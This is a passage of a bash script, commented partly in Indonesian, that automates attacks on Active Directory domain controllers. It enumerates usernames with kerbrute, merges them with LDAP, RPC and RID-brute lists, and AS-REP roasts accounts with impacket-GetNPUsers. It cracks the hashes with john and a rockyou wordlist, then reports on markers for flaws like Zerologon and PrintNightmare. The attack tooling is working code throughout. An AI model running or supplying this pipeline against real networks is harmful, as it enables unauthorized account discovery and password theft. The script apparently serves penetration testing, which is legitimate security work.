            echo "KERBRUTE_STATUS;$dc_ip;UNKNOWN;SKIPPED_NO_DOMAIN;timeout=${KERBRUTE_TIMEOUT}s;valid_users=0;output=N/A;valid_users_file=N/A" >> "$KERBRUTE_STATUS_FILE"
            continue
        fi

        # 2. Pecah hasil menjadi variabel terpisah
        discovered_domain=$(echo "$discovered_raw" | cut -d';' -f1)
        discovered_fqdn=$(echo "$discovered_raw" | cut -d';' -f2)

        # 3. Tampilkan status dan tulis dengan format 3 kolom ke file mapping
        echo -e "${GREEN}[+] Domain discovered for $dc_ip: $discovered_domain (FQDN: $discovered_fqdn)${NC}"
        echo "$dc_ip;$discovered_domain;$discovered_fqdn" >> "$DC_INFO"

        # --- JALUR KONDISIONAL: CEK USER DARI LDAP & RPC ---
        LDAP_USERS_FILE="$OUTDIR/ldap_nxc_${dc_ip}/users_only_${dc_ip}.txt"
        RPC_USERS_FILE="$OUTDIR/rpc_users_${dc_ip}.txt"

        EXISTING_USERS_COUNT=0
        if [[ -s "$LDAP_USERS_FILE" ]]; then
            EXISTING_USERS_COUNT=$(( EXISTING_USERS_COUNT + $(wc -l < "$LDAP_USERS_FILE") ))
        fi
        if [[ -s "$RPC_USERS_FILE" ]]; then
            EXISTING_USERS_COUNT=$(( EXISTING_USERS_COUNT + $(wc -l < "$RPC_USERS_FILE") ))
        fi

        if [[ "$EXISTING_USERS_COUNT" -gt 0 ]]; then
            echo -e "${GREEN}[+] AD / RPC Null Session found $EXISTING_USERS_COUNT existing users.${NC}"
            echo -e "${GREEN}[+] Skipping Kerbrute user enumeration (Already harvested accurate list).${NC}"
            echo "KERBRUTE_STATUS;$dc_ip;$discovered_domain;SKIPPED_ALREADY_HAVE_USERS;timeout=${KERBRUTE_TIMEOUT}s;valid_users=0;output=N/A;valid_users_file=N/A" >> "$KERBRUTE_STATUS_FILE"
            continue
        fi
        # ---------------------------------------------------

        if [[ -z "$RESOLVED_KERBRUTE" ]]; then
            echo -e "${YELLOW}[!] kerbrute not found in PATH/common paths. Skipping userenum.${NC}"
            echo "KERBRUTE_STATUS;$dc_ip;$discovered_domain;SKIPPED_NO_KERBRUTE;timeout=${KERBRUTE_TIMEOUT}s;valid_users=0;output=N/A;valid_users_file=N/A" >> "$KERBRUTE_STATUS_FILE"
            continue
        fi

        if [[ ! -f "$USERLIST" ]]; then
            echo -e "${YELLOW}[!] Userlist not found: $USERLIST. Skipping kerbrute.${NC}"
            echo "KERBRUTE_STATUS;$dc_ip;$discovered_domain;SKIPPED_NO_USERLIST;timeout=${KERBRUTE_TIMEOUT}s;valid_users=0;output=N/A;valid_users_file=N/A" >> "$KERBRUTE_STATUS_FILE"
            continue
        fi

        SAFE_DOMAIN=$(safe_name "$discovered_domain")
        KERB_OUT="$OUTDIR/kerbrute_${dc_ip}_${SAFE_DOMAIN}.txt"
        VALID_USERS_OUT="$OUTDIR/kerbrute_valid_users_${dc_ip}_${SAFE_DOMAIN}.txt"

        echo -e "${YELLOW}[*] Running kerbrute userenum against $dc_ip / $discovered_domain${NC}"
        echo -e "${BLUE}[i] Output: $KERB_OUT${NC}"
        echo -e "${BLUE}[i] Valid users output: $VALID_USERS_OUT${NC}"
        echo -e "${BLUE}[i] Timeout limit: ${KERBRUTE_TIMEOUT}s${NC}"

        : > "$KERB_OUT"
        : > "$VALID_USERS_OUT"

        KB_CMD="$RESOLVED_KERBRUTE userenum -d $discovered_domain --dc $dc_ip -t 50 $USERLIST -o $KERB_OUT"
        echo -e "${MAGENTA}[CMD] $KB_CMD${NC}"

        timeout "${KERBRUTE_TIMEOUT}s" "$RESOLVED_KERBRUTE" userenum \
            -d "$discovered_domain" \
            --dc "$dc_ip" -t 50 \
            "$USERLIST" \
            -o "$KERB_OUT" 2>&1 | tee -a "$RAW_OUT"

        KERB_RC=${PIPESTATUS[0]}

        clean_nxc_file "$KERB_OUT"

        grep -a "VALID USERNAME" "$KERB_OUT" 2>/dev/null | \
            awk '{print $NF}' | \
            normalize_user_only_stream | \
            sort -u > "$VALID_USERS_OUT"

        VALID_COUNT=$(wc -l < "$VALID_USERS_OUT" 2>/dev/null || echo 0)

        if [[ "$KERB_RC" -eq 0 ]]; then
            KERB_STATUS="COMPLETED"
            echo -e "${GREEN}[+] Kerbrute completed for $dc_ip / $discovered_domain. Valid users: $VALID_COUNT${NC}"
        elif [[ "$KERB_RC" -eq 124 ]]; then
            KERB_STATUS="TIMEOUT_PARTIAL"
            echo -e "${YELLOW}[!] Kerbrute timeout after ${KERBRUTE_TIMEOUT}s for $dc_ip / $discovered_domain. Partial valid users: $VALID_COUNT${NC}"
        else
            KERB_STATUS="ERROR_RC_${KERB_RC}"
            echo -e "${RED}[!] Kerbrute ended with RC=$KERB_RC for $dc_ip / $discovered_domain. Valid users parsed: $VALID_COUNT${NC}"
        fi

        echo "KERBRUTE_STATUS;$dc_ip;$discovered_domain;$KERB_STATUS;timeout=${KERBRUTE_TIMEOUT}s;valid_users=$VALID_COUNT;output=$KERB_OUT;valid_users_file=$VALID_USERS_OUT" >> "$KERBRUTE_STATUS_FILE"

        if [[ -s "$VALID_USERS_OUT" ]]; then
            echo -e "${GREEN}[+] Kerbrute valid users saved to: $VALID_USERS_OUT${NC}"
            cat "$VALID_USERS_OUT"
        else
            echo -e "${YELLOW}[!] No valid users parsed from kerbrute output for $dc_ip.${NC}"
        fi

    done < "$DC_CANDIDATES"
else
    echo -e "${YELLOW}[!] No DC candidate found from LDAP + Kerberos port mapping.${NC}"
fi


echo -e "\n${PURPLE}====================================================${NC}"
echo -e "${GREEN}[+] PHASE 2.2: MERGE LDAP USERS + RPC USERS + KERBRUTE USERS${NC}"
echo -e "${PURPLE}====================================================${NC}"

if [[ -s "$DC_INFO" ]]; then
    while IFS=';' read -r dc_ip domain fqdn; do
        [[ -z "$dc_ip" || -z "$domain" || "$domain" == "UNKNOWN" ]] && continue

        SAFE_DOMAIN=$(safe_name "$domain")
        MERGED_USERS="$OUTDIR/final_all_users_${dc_ip}_${SAFE_DOMAIN}.txt"
        TMP_MERGE="$OUTDIR/.tmp_all_users_${dc_ip}_${SAFE_DOMAIN}.txt"

        : > "$TMP_MERGE"
        : > "$MERGED_USERS"

        LDAP_USERS_FILE="$OUTDIR/ldap_nxc_${dc_ip}/users_only_${dc_ip}.txt"
        RPC_USERS_FILE="$OUTDIR/rpc_users_${dc_ip}.txt"
        KERB_USERS_FILE="$OUTDIR/kerbrute_valid_users_${dc_ip}_${SAFE_DOMAIN}.txt"
        RID_USERS_FILE="$OUTDIR/user_rid_brute.txt" 

        LDAP_COUNT=0
        RPC_COUNT=0
        KERB_COUNT=0
        RID_COUNT=0

        if [[ -s "$LDAP_USERS_FILE" ]]; then
            cat "$LDAP_USERS_FILE" | normalize_user_only_stream >> "$TMP_MERGE"
            LDAP_COUNT=$(wc -l < "$LDAP_USERS_FILE" 2>/dev/null || echo 0)
        fi

        if [[ -s "$RPC_USERS_FILE" ]]; then
            cat "$RPC_USERS_FILE" | normalize_user_only_stream >> "$TMP_MERGE"
            RPC_COUNT=$(wc -l < "$RPC_USERS_FILE" 2>/dev/null || echo 0)
        fi

        if [[ -s "$KERB_USERS_FILE" ]]; then
            cat "$KERB_USERS_FILE" | normalize_user_only_stream >> "$TMP_MERGE"
            KERB_COUNT=$(wc -l < "$KERB_USERS_FILE" 2>/dev/null || echo 0)
        fi
        if [[ -s "$RID_USERS_FILE" ]]; then
            cat "$RID_USERS_FILE" | normalize_user_only_stream >> "$TMP_MERGE"
            RID_COUNT=$(wc -l < "$RID_USERS_FILE" 2>/dev/null || echo 0)
        fi

        sort -u "$TMP_MERGE" > "$MERGED_USERS"
        rm -f "$TMP_MERGE"

        MERGED_COUNT=$(wc -l < "$MERGED_USERS" 2>/dev/null || echo 0)

        if [[ "$MERGED_COUNT" -gt 0 ]]; then
            echo -e "${GREEN}[+] Merged users for $dc_ip / $domain: $MERGED_COUNT${NC}"
            echo -e "${BLUE}[i] LDAP: $LDAP_COUNT | RPC: $RPC_COUNT | Kerbrute: $KERB_COUNT | RID: $RID_COUNT${NC}"
            echo -e "${BLUE}[i] Merged file: $MERGED_USERS${NC}"
            echo "MERGED_USERS;$dc_ip;$domain;ldap_users=$LDAP_COUNT;rpc_users=$RPC_COUNT;kerbrute_users=$KERB_COUNT;rid_users=$RID_COUNT;merged_users=$MERGED_COUNT;file=$MERGED_USERS" >> "$MERGED_USERS_STATUS_FILE"
        else
            echo -e "${YELLOW}[!] No users to merge for $dc_ip / $domain.${NC}"
            echo "MERGED_USERS;$dc_ip;$domain;ldap_users=$LDAP_COUNT;rpc_users=$RPC_COUNT;kerbrute_users=$KERB_COUNT;merged_users=0;rid_users=$RID_COUNT;file=$MERGED_USERS" >> "$MERGED_USERS_STATUS_FILE"
        fi

    done < "$DC_INFO"
else
    echo -e "${YELLOW}[!] No DC/domain mapping found. Merge phase skipped.${NC}"
    echo "MERGED_USERS;GLOBAL;N/A;SKIPPED_NO_DC_INFO;merged_users=0;file=N/A" >> "$MERGED_USERS_STATUS_FILE"
fi


echo -e "\n${PURPLE}====================================================${NC}"
echo -e "${GREEN}[+] PHASE 2.3: ASREP ROASTING${NC}"
echo -e "${PURPLE}====================================================${NC}"

if ! command -v impacket-GetNPUsers >/dev/null 2>&1; then
    echo -e "${YELLOW}[!] impacket-GetNPUsers not found. ASREP roasting skipped.${NC}"
    echo "ASREP_ROAST;GLOBAL;N/A;SKIPPED_NO_IMPACKET;hashes=0;cracked=0" >> "$ASREP_AUDIT_STATUS_FILE"
else
    if [[ -s "$DC_INFO" ]]; then
        while IFS=';' read -r dc_ip domain fqdn; do
            [[ -z "$dc_ip" || -z "$domain" || "$domain" == "UNKNOWN" ]] && continue

            SAFE_DOMAIN=$(safe_name "$domain")

            USERS_FILE="$OUTDIR/final_all_users_${dc_ip}_${SAFE_DOMAIN}.txt"
            HASH_FILE="$OUTDIR/asrep_hashes_${dc_ip}_${SAFE_DOMAIN}.txt"
            CRACKED_FILE="$OUTDIR/asrep_cracked_${dc_ip}_${SAFE_DOMAIN}.txt"

            : > "$HASH_FILE"
            : > "$CRACKED_FILE"

            if [[ ! -s "$USERS_FILE" ]]; then
                echo -e "${YELLOW}[!] No user list found for $dc_ip / $domain. Skipping.${NC}"
                echo "ASREP_ROAST;$dc_ip;$domain;SKIPPED_NO_USERS;hashes=0;cracked=0" >> "$ASREP_AUDIT_STATUS_FILE"
                continue
            fi

            echo -e "${CYAN}>>> ASREP roasting: DC=$dc_ip Domain=$domain${NC}"

            ROAST_CMD="impacket-GetNPUsers $domain/ -dc-ip $dc_ip -no-pass -usersfile $USERS_FILE -format hashcat -outputfile $HASH_FILE"
            echo -e "${MAGENTA}[CMD] $ROAST_CMD${NC}"

            timeout "${LDAP_TIMEOUT}s" impacket-GetNPUsers "$domain/" \
                -dc-ip "$dc_ip" \
                -no-pass \
                -usersfile "$USERS_FILE" \
                -format hashcat 2>&1 | tee /dev/tty | grep -F '$krb5asrep$' > "$HASH_FILE"

            RC=$?

            HASH_COUNT=$(wc -l < "$HASH_FILE" 2>/dev/null || echo 0)

            if [[ "$HASH_COUNT" -gt 0 ]]; then
                echo -e "${RED}[!] Found $HASH_COUNT ASREP hash(es). Cracking...${NC}"

                JOHN_CMD_1="john --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt --rules $HASH_FILE"
                echo -e "${MAGENTA}[CMD] $JOHN_CMD_1${NC}"
                john --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt --rules \
                     "$HASH_FILE" > /dev/null 2>&1

                JOHN_CMD_2="john --show --format=krb5asrep $HASH_FILE"
                echo -e "${MAGENTA}[CMD] $JOHN_CMD_2${NC}"
                john --show --format=krb5asrep "$HASH_FILE" > "$CRACKED_FILE"

                CRACKED_COUNT=$(grep -c ":" "$CRACKED_FILE" 2>/dev/null || echo 0)

                echo -e "${GREEN}[+] Cracked: $CRACKED_COUNT credential(s). File: $CRACKED_FILE${NC}"
                cat "$CRACKED_FILE"
            else
                CRACKED_COUNT=0
                echo -e "${GREEN}[+] No ASREP hashes found for $dc_ip / $domain.${NC}"
            fi

            if [[ "$RC" -eq 0 ]]; then
                STATUS="COMPLETED"
            elif [[ "$RC" -eq 124 ]]; then
                STATUS="TIMEOUT"
            else
                STATUS="ERROR_RC_${RC}"
            fi

            echo "ASREP_ROAST;$dc_ip;$domain;$STATUS;hashes=$HASH_COUNT;cracked=$CRACKED_COUNT;hashfile=$HASH_FILE;crackedfile=$CRACKED_FILE" >> "$ASREP_AUDIT_STATUS_FILE"

        done < "$DC_INFO"
    else
        echo -e "${YELLOW}[!] No DC/domain mapping found. Skipping.${NC}"
        echo "ASREP_ROAST;GLOBAL;N/A;SKIPPED_NO_DC_INFO;hashes=0;cracked=0" >> "$ASREP_AUDIT_STATUS_FILE"
    fi
fi


echo -e "\n${PURPLE}====================================================${NC}"
echo -e "${GREEN}[+] PHASE 3: CLEANING & FINAL REPORT${NC}"
echo -e "${PURPLE}====================================================${NC}"

clean_nxc_file "$RAW_OUT"

sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g" "$RAW_OUT" | \
grep -aEi "\[\+\]|READ|WRITE|Export|VALID USER|userenum|VULN|ZEROLOGON|PRINTNIGHTMARE|SMBGHOST|MS17" | \
grep -av "STATUS_ACCESS_DENIED" | \
sort -u > "$FINAL_OUT"

if [[ -s "$KERBRUTE_STATUS_FILE" ]]; then
    {
        echo ""
        echo "==== KERBRUTE STATUS ===="
        cat "$KERBRUTE_STATUS_FILE"
    } >> "$FINAL_OUT"
fi

if [[ -s "$MERGED_USERS_STATUS_FILE" ]]; then
    {
        echo ""
        echo "==== MERGED USERS STATUS ===="
        cat "$MERGED_USERS_STATUS_FILE"
    } >> "$FINAL_OUT"
fi

if [[ -s "$ASREP_AUDIT_STATUS_FILE" ]]; then
    {
        echo ""
        echo "==== ASREP ROASTING ===="
        cat "$ASREP_AUDIT_STATUS_FILE"
    } >> "$FINAL_OUT"
fi

if compgen -G "$OUTDIR/final_all_users_*.txt" > /dev/null; then
    {
        echo ""
        echo "==== MERGED USER FILES ===="
        for uf in "$OUTDIR"/final_all_users_*.txt; do
            [[ -f "$uf" ]] || continue
            echo "[FILE] $uf"
            echo "count=$(wc -l < "$uf")"
            echo ""
        done
    } >> "$FINAL_OUT"
fi

if compgen -G "$OUTDIR/asrep_exposed_users_*.txt" > /dev/null; then
    {
        echo ""
        echo "==== ASREP EXPOSED USERS ===="
        for af in "$OUTDIR"/asrep_exposed_users_*.txt; do
            [[ -f "$af" ]] || continue
            echo "[FILE] $af"
            if [[ -s "$af" ]]; then
                cat "$af"
            else
                echo "(empty)"
            fi
            echo ""
        done
    } >> "$FINAL_OUT"
fi

if [[ -s "$FINAL_OUT" ]]; then
    echo -e "${GREEN}[!] TEMUAN / SUMMARY:${NC}"
    cat "$FINAL_OUT"
else
    echo -e "${YELLOW}[!] Tidak ditemukan akses anonymous/guest/nullbind/userenum yang valid.${NC}"
fi

echo -e "\n${BLUE}[i] Log lengkap di: $RAW_OUT${NC}"
echo -e "${BLUE}[i] Ringkasan di: $FINAL_OUT${NC}"
echo -e "${BLUE}[i] DC candidates di: $DC_CANDIDATES${NC}"
echo -e "${BLUE}[i] DC/domain mapping di: $DC_INFO${NC}"
echo -e "${BLUE}[i] Kerbrute status di: $KERBRUTE_STATUS_FILE${NC}"
echo -e "${BLUE}[i] Merged users status di: $MERGED_USERS_STATUS_FILE${NC}"
echo -e "${BLUE}[i] ASREP audit status di: $ASREP_AUDIT_STATUS_FILE${NC}"

if compgen -G "$OUTDIR/rpc_users_*.txt" > /dev/null; then
    echo -e "${BLUE}[i] RPC valid users files:${NC}"
    ls -1 "$OUTDIR"/rpc_users_*.txt
fi

if compgen -G "$OUTDIR/kerbrute_valid_users_*.txt" > /dev/null; then
    echo -e "${BLUE}[i] Kerbrute valid users files:${NC}"
    ls -1 "$OUTDIR"/kerbrute_valid_users_*.txt
fi

if compgen -G "$OUTDIR/final_all_users_*.txt" > /dev/null; then
    echo -e "${BLUE}[i] Merged user files:${NC}"
    ls -1 "$OUTDIR"/final_all_users_*.txt
fi

echo -e "\n${GREEN}[+] Done.${NC}"
